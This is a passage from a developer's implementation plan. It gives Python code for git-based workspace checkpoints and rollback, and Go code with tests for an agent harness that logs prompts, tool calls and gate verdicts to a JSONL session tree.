then checks the target out. Never a shadow repo; never per tool call (opt-in at
prompt boundaries).
"""

from __future__ import annotations

import os
import subprocess
import tempfile
from dataclasses import dataclass
from pathlib import Path

_AUTHOR = {
    "GIT_AUTHOR_NAME": "daisugi",
    "GIT_AUTHOR_EMAIL": "daisugi@localhost",
    "GIT_COMMITTER_NAME": "daisugi",
    "GIT_COMMITTER_EMAIL": "daisugi@localhost",
}


@dataclass(frozen=True)
class Checkpoint:
    ref: str
    commit: str
    covers: list[str]
    skipped: list[str]


def _git(repo: Path, *args: str, env: dict[str, str] | None = None) -> str:
    proc = subprocess.run(
        ["git", "-C", str(repo), *args],
        check=True,
        capture_output=True,
        text=True,
        env={**os.environ, **(env or {})},
    )
    return proc.stdout.strip()


def is_repo(path: Path) -> bool:
    try:
        return _git(path, "rev-parse", "--is-inside-work-tree") == "true"
    except (subprocess.CalledProcessError, OSError):
        return False


def _safe(raw: str) -> str:
    return "".join(ch if ch.isalnum() or ch in "._-" else "_" for ch in raw)[:128] or "none"


def _head(repo: Path) -> str | None:
    try:
        return _git(repo, "rev-parse", "--verify", "-q", "HEAD")
    except subprocess.CalledProcessError:
        return None


def snapshot(
    repo: Path,
    *,
    session_id: str,
    entry_id: str,
    prefix: str = "checkpoints",
    max_file_bytes: int = 5_000_000,
) -> Checkpoint:
    ref = f"refs/daisugi/{prefix}/{_safe(session_id)}/{_safe(entry_id)}"
    git_dir = Path(_git(repo, "rev-parse", "--git-dir"))
    if not git_dir.is_absolute():
        git_dir = repo / git_dir
    with tempfile.NamedTemporaryFile(dir=git_dir, prefix="daisugi-index-", delete=False) as tmp:
        index = tmp.name
    os.unlink(index)  # git treats a missing index as empty; a zero-byte file is "corrupt"
    try:
        env = {"GIT_INDEX_FILE": index}
        _git(repo, "add", "-A", "--", ".", env=env)  # tracked + untracked, honours .gitignore
        listed = _git(repo, "ls-files", "-z", env=env).split("\0")
        covers, skipped = [], []
        for name in filter(None, listed):
            p = repo / name
            try:
                if p.is_file() and p.stat().st_size > max_file_bytes:
                    skipped.append(name)
                    continue
            except OSError:
                skipped.append(name)
                continue
            covers.append(name)
        if skipped:
            _git(repo, "rm", "--cached", "-q", "--", *skipped, env=env)
        tree = _git(repo, "write-tree", env=env)
        parent = _head(repo)
        args = ["commit-tree", tree, "-m", f"daisugi {prefix} {session_id}/{entry_id}"]
        if parent:
            args += ["-p", parent]
        commit = _git(repo, *args, env={**env, **_AUTHOR})
        _git(repo, "update-ref", ref, commit)
    finally:
        try:
            os.unlink(index)
        except OSError:
            pass
    return Checkpoint(ref=ref, commit=commit, covers=sorted(covers), skipped=sorted(skipped))


def restore(repo: Path, *, ref: str, session_id: str, entry_id: str) -> Checkpoint:
    """Put the working tree at ``ref``. Returns the rollback checkpoint taken first."""
    rollback = snapshot(repo, session_id=session_id, entry_id=entry_id, prefix="rollback")
    git_dir = Path(_git(repo, "rev-parse", "--git-dir"))
    if not git_dir.is_absolute():
        git_dir = repo / git_dir
    with tempfile.NamedTemporaryFile(dir=git_dir, prefix="daisugi-index-", delete=False) as tmp:
        index = tmp.name
    os.unlink(index)
    try:
        env = {"GIT_INDEX_FILE": index}
        _git(repo, "read-tree", ref, env=env)
        _git(repo, "checkout-index", "-a", "-f", env=env)
        wanted = set(_git(repo, "ls-tree", "-r", "--name-only", ref).splitlines())
        present = set(
            filter(
                None,
                _git(repo, "ls-files", "-z", "--cached", "--others", "--exclude-standard").split(
                    "\0"
                ),
            )
        )
        for name in sorted(present - wanted):
            try:
                (repo / name).unlink()
            except OSError:
                pass
    finally:
        try:
            os.unlink(index)
        except OSError:
            pass
    return rollback


def list_refs(repo: Path, session_id: str) -> list[str]:
    out = _git(
        repo,
        "for-each-ref",
        "--format=%(refname)",
        f"refs/daisugi/checkpoints/{_safe(session_id)}/",
    )
    return out.splitlines() if out else []
```

Gate integration (`gate.py`): `--checkpoints` flag (`store_true`) in `_build_parser`,
`gate_and_contract(..., checkpoints: bool = False)`. After the tree write, when
`checkpoints and decision.allow and isinstance(payload, dict)`:

```python
def _maybe_checkpoint(root: Path, payload: dict[str, Any], *, session_id: str | None) -> None:
    """Snapshot the workspace once per new prompt. Best-effort; never touches the verdict."""
    try:
        from opendaisugi.checkpoints import is_repo, snapshot
        from opendaisugi.claude_transcript import last_prompt_uuid, read_turns
        from opendaisugi.session_tree import SessionTree

        cwd = payload.get("cwd")
        tpath = payload.get("transcript_path")
        if not cwd or not tpath or not is_repo(Path(cwd)):
            return
        prompt = last_prompt_uuid(read_turns(Path(tpath)))
        if not prompt:
            return
        sid = _safe_session_id(session_id or payload.get("session_id"))
        state = root / "checkpoint-state" / f"{sid}.json"
        last = json.loads(state.read_text()).get("prompt") if state.exists() else None
        if last == prompt:
            return
        tree = SessionTree.open(root.parent / "sessions", sid)
        entry_id = tree.head() or "root"
        cp = snapshot(Path(cwd), session_id=sid, entry_id=entry_id)
        tree.append(
            "checkpoint",
            {
                "ref": cp.ref,
                "commit": cp.commit,
                "covers": cp.covers,
                "skipped": cp.skipped,
                "promptUuid": prompt,
            },
        )
        state.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
        state.write_text(json.dumps({"prompt": prompt}))
    except Exception:  # noqa: BLE001 — best-effort by contract
        pass
```

Add a gate test that a checkpoint entry appears once for two calls under the same prompt
(reuse `tests/test_claude_transcript.py`'s `ROWS` to write a transcript in a temp git repo).

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/test_checkpoints.py tests/test_gate_tree.py -q`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/opendaisugi/checkpoints.py src/opendaisugi/gate.py tests/test_checkpoints.py tests/test_gate_tree.py
git commit -m "feat(sessions): opt-in workspace checkpoints as private refs, one per prompt, with a rollback"
```

---

### Task 10: sprig writes the session tree on path E

**Files:**
- Create: `harness/sprig/session_tree.go`, `harness/sprig/session_tree_test.go`
- Modify: `harness/sprig/cli.go:25-30` (flags `--session-dir`, `--session`, `--resume`), the agent loop file (read `harness/sprig/agent.go` or wherever `agent.History` is defined) to call the observer, `harness/sprig/gate.go:68-78` (`Executor.Execute` reports the verdict)

**Interfaces:**
- Produces (Go):

```go
type Observer interface {
    OnPrompt(text string)
    OnAssistant(model, text string, usage Usage, toolUses []ToolUse)
    OnToolCall(id, name string, input map[string]any)
    OnVerdict(id string, allow bool, reason string, latency time.Duration)
    OnToolResult(id string, ok bool, summary string)
}
type Usage struct{ Fresh, CacheRead, CacheWrite, Out int }
type ToolUse struct{ ID, Name string }
type SessionWriter struct{ ... }
func NewSessionWriter(dir, sessionID, cwd string) (*SessionWriter, error)   // writes the header
func OpenSessionWriter(dir, sessionID string) (*SessionWriter, error)        // append to an existing file
func (w *SessionWriter) Path() string
func (w *SessionWriter) Head() string
// Observer methods on *SessionWriter
func ReadEntries(path string) ([]Entry, error)                              // skips a torn last line
func HeadPath(path string) ([]Entry, error)                                 // root→head, for --resume
```

- [ ] **Step 1: Write the failing tests**

```go
// harness/sprig/session_tree_test.go
package sprig

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
	"time"
)

func TestSessionWriterWritesTheSpecShape(t *testing.T) {
	dir := t.TempDir()
	w, err := NewSessionWriter(dir, "e1", "/w")
	if err != nil {
		t.Fatal(err)
	}
	w.OnPrompt("list files")
	w.OnAssistant("claude-sonnet-4", "Sure.", Usage{Fresh: 12, CacheRead: 1000, CacheWrite: 50, Out: 30},
		[]ToolUse{{ID: "toolu_1", Name: "bash"}})
	w.OnToolCall("toolu_1", "bash", map[string]any{"command": "ls"})
	w.OnVerdict("toolu_1", false, "permissions: no pipes", 400*time.Microsecond)
	w.OnToolResult("toolu_1", false, "REFUSED by the gate")

	raw, _ := os.ReadFile(filepath.Join(dir, "e1.jsonl"))
	var rows []map[string]any
	for _, line := range splitLines(raw) {
		var m map[string]any
		if err := json.Unmarshal(line, &m); err != nil {
			t.Fatalf("bad line %q: %v", line, err)
		}
		rows = append(rows, m)
	}
	if rows[0]["type"] != "session" || rows[0]["harness"] != "sprig" || rows[0]["v"] != float64(1) {
		t.Fatalf("bad header: %v", rows[0])
	}
	want := []string{"session", "prompt", "assistant", "tool_call", "verdict", "tool_result"}
	for i, ty := range want {
		if rows[i]["type"] != ty {
			t.Fatalf("row %d: want %s got %v", i, ty, rows[i]["type"])
		}
	}
	if rows[1]["parentId"] != nil {
		t.Fatalf("prompt must be a root: %v", rows[1])
	}
	for i := 2; i < len(rows); i++ {
		if rows[i]["parentId"] != rows[i-1]["id"] {
			t.Fatalf("row %d not linked to previous: %v", i, rows[i])
		}
		if len(rows[i]["id"].(string)) != 8 {
			t.Fatalf("id must be 8 hex: %v", rows[i]["id"])
		}
	}
	usage := rows[2]["usage"].(map[string]any)
	if usage["cacheRead"] != float64(1000) {
		t.Fatalf("usage not written: %v", usage)
	}
	if rows[4]["decision"] != "deny" || rows[4]["toolUseId"] != "toolu_1" {
		t.Fatalf("verdict: %v", rows[4])
	}
}

func TestHeadPathSkipsTornLineAndFollowsHead(t *testing.T) {
	dir := t.TempDir()
	w, _ := NewSessionWriter(dir, "e2", "/w")
	w.OnPrompt("one")
	w.OnAssistant("m", "a", Usage{}, nil)
	f, _ := os.OpenFile(w.Path(), os.O_APPEND|os.O_WRONLY, 0o600)
	f.WriteString(`{"type":"assistant","id":"abcd`)
	f.Close()
	path, err := HeadPath(w.Path())
	if err != nil {
		t.Fatal(err)
	}
	if len(path) != 2 || path[0].Type != "prompt" || path[1].Type != "assistant" {
		t.Fatalf("head path: %+v", path)
	}
}

func TestOpenSessionWriterAppendsToTheSameTree(t *testing.T) {
	dir := t.TempDir()
	w, _ := NewSessionWriter(dir, "e3", "/w")
	w.OnPrompt("one")
	again, err := OpenSessionWriter(dir, "e3")
	if err != nil {
		t.Fatal(err)
	}
	again.OnPrompt("two")
	entries, _ := ReadEntries(again.Path())
	if entries[2].ParentID != entries[1].ID {
		t.Fatalf("second prompt must hang off the head: %+v", entries)
	}
}
```

Add a small `splitLines([]byte) [][]byte` helper in the test file.

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd harness/sprig && go test ./... -run 'SessionWriter|HeadPath' -v`
Expected: FAIL to compile (`undefined: NewSessionWriter`).

- [ ] **Step 3: Write minimal implementation**

```go
// harness/sprig/session_tree.go
// The session tree on path E: sprig owns the loop, so it writes the same
// JSONL daisugi's gate writes on path D (docs/plans/2026-08-27-cockpit-spec.md §6.1).
package sprig

import (
	"bufio"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"time"
)

type Usage struct{ Fresh, CacheRead, CacheWrite, Out int }
type ToolUse struct{ ID, Name string }

type Observer interface {
	OnPrompt(text string)
	OnAssistant(model, text string, usage Usage, toolUses []ToolUse)
	OnToolCall(id, name string, input map[string]any)
	OnVerdict(id string, allow bool, reason string, latency time.Duration)
	OnToolResult(id string, ok bool, summary string)
}

// NoopObserver is the default when --session-dir is not set.
type NoopObserver struct{}

func (NoopObserver) OnPrompt(string)                                   {}
func (NoopObserver) OnAssistant(string, string, Usage, []ToolUse)      {}
func (NoopObserver) OnToolCall(string, string, map[string]any)         {}
func (NoopObserver) OnVerdict(string, bool, string, time.Duration)     {}
func (NoopObserver) OnToolResult(string, bool, string)                 {}

type Entry struct {
	Type     string         `json:"type"`
	ID       string         `json:"id,omitempty"`
	ParentID *string        `json:"parentId"`
	TS       float64        `json:"ts"`
	Data     map[string]any `json:"-"`
}

type SessionWriter struct {
	path string
	head string // "" means root
}

func newID() string {
	b := make([]byte, 4)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

func now() float64 { return float64(time.Now().UnixNano()) / 1e9 }

func NewSessionWriter(dir, sessionID, cwd string) (*SessionWriter, error) {
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return nil, err
	}
	w := &SessionWriter{path: filepath.Join(dir, sessionID+".jsonl")}
	if _, err := os.Stat(w.path); err == nil {
		return nil, errors.New("session file exists: " + w.path)
	}
	header := map[string]any{
		"type": "session", "v": 1, "id": sessionID, "harness": "sprig", "cwd": cwd,
		"harnessSessionId": nil, "transcriptPath": nil, "parentSession": nil,
		"parentEntry": nil, "cacheKey": nil, "ts": now(),
	}
	if err := w.writeRaw(header); err != nil {
		return nil, err
	}
	_ = os.Chmod(w.path, 0o600)
	return w, nil
}

func OpenSessionWriter(dir, sessionID string) (*SessionWriter, error) {
	w := &SessionWriter{path: filepath.Join(dir, sessionID+".jsonl")}
	entries, err := ReadEntries(w.path)
	if err != nil {
		return nil, err
	}
	w.head = headOf(entries)
	return w, nil
}

func (w *SessionWriter) Path() string { return w.path }
func (w *SessionWriter) Head() string { return w.head }

func (w *SessionWriter) writeRaw(row map[string]any) error {
	f, err := os.OpenFile(w.path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
	if err != nil {
		return err
	}
	defer f.Close()
	b, err := json.Marshal(row)
	if err != nil {
		return err
	}
	_, err = f.Write(append(b, '\n'))
	return err
}

func (w *SessionWriter) append(typ string, data map[string]any) {
	row := map[string]any{"type": typ, "id": newID(), "ts": now()}
	if w.head == "" {
		row["parentId"] = nil
	} else {
		row["parentId"] = w.head
	}
	for k, v := range data {
		row[k] = v
	}
	if err := w.writeRaw(row); err != nil {
		return // best-effort: a write failure never stops the loop
	}
	w.head = row["id"].(string)
}

func (w *SessionWriter) OnPrompt(text string) { w.append("prompt", map[string]any{"text": text}) }

func (w *SessionWriter) OnAssistant(model, text string, u Usage, uses []ToolUse) {
	tu := make([]map[string]any, 0, len(uses))
	for _, x := range uses {
		tu = append(tu, map[string]any{"id": x.ID, "name": x.Name})
	}
	w.append("assistant", map[string]any{
		"model": model, "text": text,
		"usage":    map[string]any{"fresh": u.Fresh, "cacheRead": u.CacheRead, "cacheWrite": u.CacheWrite, "out": u.Out},
		"toolUses": tu,
	})
}

func (w *SessionWriter) OnToolCall(id, name string, input map[string]any) {
	w.append("tool_call", map[string]any{"toolUseId": id, "name": name, "input": input,
		"detail": detailOf(name, input), "agentId": nil, "agentType": nil})
}

func (w *SessionWriter) OnVerdict(id string, allow bool, reason string, latency time.Duration) {
	decision := "deny"
	if allow {
		decision = "allow"
	}
	w.append("verdict", map[string]any{"toolUseId": id, "decision": decision, "mode": "enforce",
		"reason": reason, "clause": reason, "counterexample": map[string]any{},
		"envelopeId": nil, "planId": nil, "latencyMs": float64(latency.Microseconds()) / 1000.0,
		"answeredBy": nil})
}

func (w *SessionWriter) OnToolResult(id string, ok bool, summary string) {
	if len(summary) > 400 {
		summary = summary[:400]
	}
	w.append("tool_result", map[string]any{"toolUseId": id, "ok": ok, "summary": summary})
}

func detailOf(name string, input map[string]any) string {
	for _, k := range []string{"command", "path", "file_path", "url"} {
		if v, ok := input[k].(string); ok {
			return v
		}
	}
	return name
}

// ReadEntries parses the file, skipping blank and torn lines.
func ReadEntries(path string) ([]Entry, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var out []Entry
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 1<<20), 1<<24)
	for sc.Scan() {
		line := sc.Bytes()
		if len(line) == 0 {
			continue
		}
		var raw map[string]any
		if err := json.Unmarshal(line, &raw); err != nil {
			continue
		}
		e := Entry{Type: str(raw["type"]), ID: str(raw["id"]), TS: num(raw["ts"]), Data: raw}
		if p, ok := raw["parentId"].(string); ok {
			e.ParentID = &p
		}
		out = append(out, e)
	}
	return out, sc.Err()
}

func headOf(entries []Entry) string {
	head := ""
	for _, e := range entries {
		switch e.Type {
		case "head":
			head = str(e.Data["leafId"])
		case "label", "session":
		default:
			if e.ID != "" {
				head = e.ID
			}
		}
	}
	return head
}

// HeadPath returns root→head, the messages --resume rebuilds from.
func HeadPath(path string) ([]Entry, error) {
	entries, err := ReadEntries(path)
	if err != nil {
		return nil, err
	}
	byID := map[string]Entry{}
	for _, e := range entries {
		if e.ID != "" && e.Type != "session" {
			byID[e.ID] = e
		}
	}
	var out []Entry
	for cur := headOf(entries); cur != ""; {
		e, ok := byID[cur]
		if !ok {
			break
		}
		out = append([]Entry{e}, out...)
		if e.ParentID == nil {
			break
		}
		cur = *e.ParentID
	}
	return out, nil
}

func str(v any) string {
	s, _ := v.(string)
	return s
}

func num(v any) float64 {
	f, _ := v.(float64)
	return f
}
```

Wiring: in `cli.go` add `--session-dir` (string), `--session` (string, default a fresh
UUID from `crypto/rand`), `--resume` (string). Build `var obs Observer = NoopObserver{}`;
with `--session-dir`, `obs, err = NewSessionWriter(dir, session, cwd)` (or
`OpenSessionWriter` for `--resume`). Pass `obs` into the agent and into
`Executor` (a new field `Observer Observer`); `Executor.Execute` calls
`obs.OnToolCall` before `gate.Check`, `obs.OnVerdict` with the verdict and elapsed time,
and `obs.OnToolResult` after the tool runs. The agent loop calls `obs.OnPrompt` for the
user prompt and `obs.OnAssistant` for each model reply (map the API `usage` fields:
`input_tokens`→Fresh, `cache_read_input_tokens`→CacheRead,
`cache_creation_input_tokens`→CacheWrite, `output_tokens`→Out; the text-hardened
backend has no usage, pass zeros). For `--resume`, rebuild the model-facing history from
`HeadPath`: prompt→user text, assistant→assistant text plus its tool uses, tool_result→the
result. If the history type cannot be rebuilt losslessly from those fields, add a
`"raw"` field on `assistant` and `tool_result` entries holding the exact API message JSON
and restore from `raw`. Print the session id on stderr at start: `sprig: session <id> at <path>`.

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd harness/sprig && go test ./... && go vet ./...`
Expected: PASS. Then a live smoke on path B (subscription, no key): `sprig --gate
--session-dir /tmp/x "write hello to hi.txt"` and confirm the JSONL has prompt,
assistant, tool_call, verdict, tool_result entries.

- [ ] **Step 5: Commit**

```bash
git add harness/sprig/session_tree.go harness/sprig/session_tree_test.go harness/sprig/cli.go harness/sprig/gate.go harness/sprig/agent.go
git commit -m "feat(sprig): write the session tree on path E and resume from its head"
```

---

## Self-review

- Spec coverage (§6): store + fork + index (T1, T2), join keys (T3), structured verdicts (T4), gate writes the tree (T5), transcript reader (T6), parser ids (T7), ask flow + settings timeout + proposals (T8), checkpoints (T9), sprig (T10). `note` entries and `compaction`/`branch_summary` types exist in `ENTRY_TYPES`; nothing writes them yet (plan 4's tree screen writes `label` and `branch_summary`; compaction is a path-E event for a later sprig change). Stated here so it is not mistaken for coverage.
- Placeholders: Task 10's agent-loop wiring names the files to read and the exact calls to add; the `raw` fallback is a concrete rule, not "handle later".
- Types: `GateDecision.ask/updated_input` (T4) are the fields T8 sets with `dataclasses.replace`. `SessionTree.append(type, data, *, parent_id)` is called the same way in T5 and T9. `ask.wait_answer(root, *, tool_use_id, timeout_s, poll_s, sleep, clock)` matches `_maybe_ask`. The Go `Entry.Data` holds the raw row so `HeadPath` can rebuild messages.
